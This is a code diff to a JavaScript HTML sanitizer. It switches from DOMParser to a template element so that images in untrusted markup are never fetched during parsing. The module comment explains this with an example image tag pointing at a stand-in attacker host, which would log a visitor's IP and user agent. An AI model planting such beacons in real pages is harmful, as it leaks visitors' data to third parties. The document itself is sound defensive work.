@@ -32,13 +32,35 @@
  * What it does not understand cannot survive, because nothing survives by
  * default. `ownerDocument` is asserted in the tests for exactly this reason.
  *
- * **`DOMParser` is the parse step because it is inert.** It executes no
- * scripts and — unlike `innerHTML` on a detached element, which is also
- * script-inert — it fetches no resources, so an `<img src>` in the input never
- * reaches the network even though the element is discarded a moment later.
- * `Utils.sanitizeInput()` already uses it, so this is the codebase's existing
- * mechanism rather than a new one; that function stays as it is, since for a
- * CSS class name or an element id "strip everything" remains correct.
+ * **The parse goes through a `<template>`, and NOT through `DOMParser`.** Both
+ * mark `<script>` non-executable, so both are safe against script execution —
+ * but they differ on SUBRESOURCES, and this was got wrong first time round.
+ * MDN is explicit that a `DOMParser` document "can download resources
+ * specified in `<iframe>` and `<img>` elements", so an
+ * `<img src="https://attacker.test/log?…">` in a response would have hit the
+ * network at parse time, leaking the visitor's IP and user agent, even though
+ * the element is discarded microseconds later and never rendered. A
+ * `<template>`'s `content` belongs to the template contents owner document,
+ * which has no browsing context: images in it are not loaded and nothing is
+ * fetched. This is the same primitive DOMPurify parses into, for the same
+ * reason.
+ *
+ * That is a PRIVACY leak rather than an XSS one — no script runs either way,
+ * and the constructive rebuild below means nothing hostile survives into the
+ * output regardless. It is still worth closing, and it is worth stating
+ * accurately: the earlier version of this comment claimed `DOMParser` fetched
+ * nothing, which is exactly the kind of confident-and-wrong security note that
+ * stops the next reader from checking.
+ *
+ * **jsdom cannot test this.** It performs no subresource loading at all, so a
+ * unit test passes under either implementation and proves nothing; verifying
+ * it needs a real browser watching the network. The defence here is the choice
+ * of primitive, not a test.
+ *
+ * `Utils.sanitizeInput()` still uses `DOMParser` and is deliberately unchanged:
+ * it sanitizes CSS class names and element ids supplied by the CONSUMER, not
+ * markup from an API response, and for those "strip everything" remains
+ * correct.
  *
  * **`Element.setHTML()` was weighed and rejected**, though it is the obviously
  * right long-term answer. As of August 2026 it ships in Chrome/Edge 146+ and
@@ -303,7 +325,11 @@ export function sanitizeHtml(input) {
     if (null === input || undefined === input) {
         return fragment;
     }
-    const parsed = new DOMParser().parseFromString(String(input), 'text/html');
-    rebuildInto(parsed.body, fragment);
+    // A `<template>`, NOT `DOMParser` — see the module comment. Its `content`
+    // belongs to the template contents owner document, which has no browsing
+    // context, so images and iframes inside it are never fetched.
+    const template = document.createElement('template');
+    template.innerHTML = String(input);
+    rebuildInto(template.content, fragment);
     return fragment;
 }
